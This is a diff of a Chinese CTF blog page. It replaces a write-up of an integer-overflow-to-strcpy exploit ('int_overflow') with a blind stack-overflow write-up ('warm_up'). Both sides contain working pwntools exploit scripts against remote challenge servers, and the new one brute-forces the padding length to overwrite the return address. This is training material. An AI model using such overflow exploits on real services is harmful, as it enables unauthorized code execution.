@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="int_overflow, 矢坕个人博客">
+    <meta name="keywords" content="打卡：盲打题:warm_up, 矢坕个人博客">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>int_overflow | 矢坕个人博客</title>
+    <title>打卡：盲打题:warm_up | 矢坕个人博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">int_overflow</h1>
+                    <h1 class="description center-align post-title">打卡：盲打题:warm_up</h1>
                 </div>
             </div>
         </div>
@@ -443,21 +443,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-12-31
+                    2023-01-05
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-12-31
+                    2023-01-05
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    381
+                    268
                 </div>
                 
 
@@ -482,28 +482,37 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="int-overflow-wp"><a href="#int-overflow-wp" class="headerlink" title="int_overflow  wp"></a>int_overflow  wp</h2><p>这题涉及到了整数溢出漏洞，值得写一篇博客。<br>先checksec一下：<br><img src="/images/int-overflow/1.png"><br>只开了NX保护机制<br>拖入IDA查看：<br><img src="/images/int-overflow/2.png"><br>主函数里没有什么可以利用的<br>打开login（）函数：<br><img src="/images/int-overflow/3.png"><br>有read函数但是无法溢出……打开check_passwd函数这里涉及到一个知识点unsigned_int8定义的是一个无符号型8位整数<br>具体解释如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">int8取值范围是-128 - 127
+                <h2 id="盲打题warm-up"><a href="#盲打题warm-up" class="headerlink" title="盲打题warm_up"></a>盲打题warm_up</h2><p>碰到这题的时候以为是题目忘记给附件了，竟然没有题目……后来搜了一下我才知道：我在做一种很新的题目……<br><img src="/images/warm-up/1.png"><br>在碰到这个没附件的题目的时候，就可以做好打盲打的准备了，<strong>很显然第一次碰到，一脸懵逼，故打卡记录</strong><br><img src="/images/warm-up/2.png"><br>看了一下确实是什么反应都没有，输入%p没有任何回应，显然不是格式化字符串漏洞，这时考虑栈溢出。（都盲打了，什么也不知道不至于用什么保护机制来坑人吧）<br>给的0x40060d肯定是返回地址<br>学习下别人写的exp：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+sys <span class="token operator">=</span> <span class="token number">0x40060d</span>
 
-unsigned int8 0-255
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+	<span class="token keyword">try</span><span class="token punctuation">:</span>
+　　		io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">52590</span><span class="token punctuation">)</span>
+　　		payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span>i <span class="token operator">+</span> p64<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>
+　　		io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>
+　　		io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+　　		<span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+　　		io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	<span class="token keyword">except</span><span class="token punctuation">:</span>
+　　		io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+或
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+sys <span class="token operator">=</span> <span class="token number">0x40060d</span>
 
-Int16 意思是16位整数(16bit integer)，相当于short 占2个字节 -32768 ~ 32767
-
-Int32 意思是32位整数(32bit integer), 相当于 int 占4个字节 -2147483648 ~ 2147483647
-
-Int64 意思是64位整数(64bit interger), 相当于 long long 占8个字节 -9223372036854775808 ~ 9223372036854775807<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>这里涉及到一个整数溢出：strlen函数读取buf的字符长度以int类型返回是32位字节的，而将它赋给了v3如果返回值大于255则会发生整数溢出，将高位字节截断保留低位字节<br>我们看到if函数的else部分是我们可以利用的，有个危险函数strcpy（）可以复制任意长度字符串，这里可以将s的字符串复制到dest数组并发生溢出<br>那思路就拟好了先让v3在4~8区间内判断到else区间执行然后该怎么覆盖怎么覆盖<br>dest的栈空间如下：<br><img src="/images/int-overflow/4.png"><br>上exp：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
-io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"223.112.5.156"</span><span class="token punctuation">,</span><span class="token number">63036</span><span class="token punctuation">)</span>
-payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x0804868b</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">232</span>
-io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"username:\n"</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"zjh"</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"passwd:\n"</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>获得flag：<br><img src="/images/int-overflow/5.png"></p>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+	<span class="token keyword">try</span><span class="token punctuation">:</span>
+　　		io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">52590</span><span class="token punctuation">)</span>
+　　		payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span>i <span class="token operator">+</span> p32<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>
+　　		io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>
+　　		io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+　　		<span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+　　		io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	<span class="token keyword">except</span><span class="token punctuation">:</span>
+　　		io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>两种代码那去试看看是32位还是64位</p>
 
                 
             </div>
@@ -530,7 +539,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://airunfive.github.io/2022/12/31/int-overflow/">http://airunfive.github.io/2022/12/31/int-overflow/</a>
+                    <a href="http://airunfive.github.io/2023/01/05/%E6%89%93%E5%8D%A1%EF%BC%9A%E7%9B%B2%E6%89%93%E9%A2%98-warm-up/">http://airunfive.github.io/2023/01/05/%E6%89%93%E5%8D%A1%EF%BC%9A%E7%9B%B2%E6%89%93%E9%A2%98-warm-up/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -735,54 +744,18 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2023/01/04/Mary-Morton/">
+                <a href="/2023/01/05/%E6%89%93%E5%8D%A1%EF%BC%9A%E7%9B%B2%E6%89%93%E9%A2%98-warm-up/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="Mary_Morton">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="打卡：盲打题:warm_up">
                         
-                        <span class="card-title">Mary_Morton</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-01-04
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            矢坕
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2022/12/28/guess-num/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="guess_num">
-                        
-                        <span class="card-title">guess_num</span>
+                        <span class="card-title">打卡：盲打题:warm_up</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -793,7 +766,45 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-28
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-05
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            矢坕
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/01/05/stack2/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="stack2">
+                        
+                        <span class="card-title">stack2</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-05
                             </span>
                         <span class="publish-author">
                             
